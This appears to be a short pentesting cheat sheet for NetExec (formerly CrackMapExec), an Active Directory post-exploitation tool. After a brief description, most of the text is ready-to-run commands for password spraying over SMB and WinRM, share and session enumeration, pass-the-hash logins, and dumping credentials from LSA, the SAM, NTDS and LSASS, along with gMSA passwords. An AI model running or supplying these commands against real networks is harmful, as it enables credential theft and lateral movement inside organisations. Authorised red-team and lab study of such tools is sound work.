# CrackMapExec

NetExec (formerly CrackMapExec) is a post-exploitation and enumeration framework for Active Directory
environments.
#### It combines:
1. Authentication testing
2. Enumeration
3. Remote command execution
4. Credential dumping
5. Module-based attacks


#### How NetExec Works
1. You provide target IPs or ranges
2. You provide credentials (password, NTLM hash, Kerberos ticket)
3. NetExec attempts authentication over multiple protocols
4. If successful, it performs enumeration or exploitation

   
#### Supported protocols:
1. SMB
2. LDAP
3. WinRM
4. MSSQL

#### Common NetExec Commands (Lab Use)  
Test SMB authentication:  
`netexec smb 192.168.1.0/24 -u user -p password`  
Enumerate shares:  
`netexec smb 192.168.1.10 -u user -p password --shares`  
Enumerate active sessions:  
`netexec smb 192.168.1.10 -u user -p password --sessions`  
Check local administrator access:  
`netexec smb 192.168.1.0/24 -u user -p password --local-admins`  
Dump credentials (requires privileges):  
`netexec smb 192.168.1.10 -u admin -p password --lsa`  

---

`crackmapexec ldap -L`

`crackmapexec mysql -L`

`crackmapexec smb -L`

`crackmapexec ssh -L`

`crackmapexec winrm -L`

`crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" -M lsassy`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --ntds --user <USERNAME>`  
`crackmapexec smb <RHOST> -u "<USERNAME>" -H "<NTLMHASH>" --ntds`  

`crackmapexec ldap <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --gmsa -k`

`crackmapexec winrm -u usernames.txt -p '<PASSWORD>' -d <DOMAIN> <RHOST>`

